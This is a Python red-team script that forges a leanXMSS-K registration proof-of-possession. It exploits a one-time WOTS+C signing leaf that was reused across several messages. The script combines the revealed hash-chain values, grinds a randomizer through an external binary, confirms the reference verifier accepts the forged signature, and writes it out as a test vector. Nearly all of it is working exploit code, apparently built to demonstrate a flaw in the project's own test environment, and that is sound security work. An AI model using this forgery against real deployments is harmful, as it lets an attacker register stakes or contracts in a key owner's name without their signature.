"""Forge a leanXMSS-K registration proof of possession from reused one-time PoP leaves.

Input: the PoP-slot signatures of key A committed in contracts/test/vectors/leanxmss_k.json
(three different messages, all signed by the same WOTS+C leaf: slot 2^32-1). No secret key.

Output: contracts/test/vectors/redteam/forged_pop.json, a registration request for key A on a
stake and contract the key owner never signed for, which the reference verifier accepts.

usage: .venv/bin/python ../redteam/forge_pop.py [stake_id] [contract hex] [chain_id]   (cwd: xmss/)
"""

import json
import subprocess
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "xmss"))
import leanxmss_k as x  # noqa: E402

ROOT = Path(__file__).resolve().parent.parent
VECTORS = ROOT / "contracts/test/vectors/leanxmss_k.json"
OUT = ROOT / "contracts/test/vectors/redteam/forged_pop.json"
GRIND = ROOT / "redteam/grind"


def b(h: str) -> bytes:
    return bytes.fromhex(h[2:] if h.startswith("0x") else h)


def main() -> None:
    stake_id = int(sys.argv[1]) if len(sys.argv) > 1 else 0xDEAD
    contract = b(sys.argv[2]) if len(sys.argv) > 2 else b("0x0000000000000000000000000000000000007a11")
    chain_id = int(sys.argv[3]) if len(sys.argv) > 3 else 31337

    v = json.loads(VECTORS.read_text())
    pubkey = b(v["pubkeyA"])
    P = pubkey[x.N :]
    # Every observed signature by key A at the PoP slot (public data).
    observed = [(b(v["message"]), b(v["popSlotSignature"]))]
    observed += [(b(r["message"]), b(r["signature"])) for r in v["registrations"] if r["pubkey"] == v["pubkeyA"]]
    for m, s in observed:
        assert x.verify(pubkey, x.POP_SLOT, m, s)

    t_msg = x.tweak(x.MESSAGE, x.BOTTOM, 0xFFFF, 0xFFFF)
    digit_sets = []
    for m, s in observed:
        bottom = s[x.LAYER_SIG_LENGTH :]
        digit_sets.append(x.digits(x.K(P + t_msg + bottom[: x.N] + m)))
    # For each chain: the observed signature that reveals the earliest chain position.
    src = [min(range(len(observed)), key=lambda c: digit_sets[c][i]) for i in range(x.CHAINS)]
    mins = [digit_sets[src[i]][i] for i in range(x.CHAINS)]
    print(f"{len(observed)} observed PoP signatures; revealed min digits sum = {sum(mins)}")

    target = x.pop_message(chain_id, contract, stake_id, pubkey)
    assert all(target != m for m, _ in observed)
    t0 = time.time()
    out = subprocess.run(
        [str(GRIND), (P + t_msg).hex(), target.hex(), "".join(map(str, mins))],
        check=True,
        capture_output=True,
        text=True,
    ).stdout.split()
    rho, tries = b(out[0]), int(out[1])
    print(f"ground rho in {time.time() - t0:.1f}s (~{tries:.3g} hashes)")

    a = x.digits(x.K(P + t_msg + rho + target))
    assert sum(a) == x.TARGET_SUM and all(a[i] >= mins[i] for i in range(x.CHAINS))

    top = observed[0][1][: x.LAYER_SIG_LENGTH]  # top leaf 0xFFFF always signs the same bottom root
    sigma = b""
    for i in range(x.CHAINS):
        s = observed[src[i]][1][x.LAYER_SIG_LENGTH:]
        start = x.N + i * x.N
        sigma += x.chain(P, x.BOTTOM, 0xFFFF, 0xFFFF, i, s[start : start + x.N], mins[i], a[i])
    auth = observed[0][1][x.LAYER_SIG_LENGTH + x.N + x.CHAINS * x.N :]
    forged = top + rho + sigma + auth
    assert len(forged) == x.SIGNATURE_LENGTH
    assert x.verify(pubkey, x.POP_SLOT, target, forged), "forgery rejected by reference"
    print("reference verifier accepts forged PoP")

    OUT.parent.mkdir(parents=True, exist_ok=True)
    OUT.write_text(
        json.dumps(
            {
                "chainId": chain_id,
                "contract": "0x" + contract.hex(),
                "stakeId": stake_id,
                "pubkey": "0x" + pubkey.hex(),
                "message": "0x" + target.hex(),
                "signature": "0x" + forged.hex(),
            },
            indent=2,
        )
        + "\n"
    )
    print(f"wrote {OUT}")


if __name__ == "__main__":
    main()
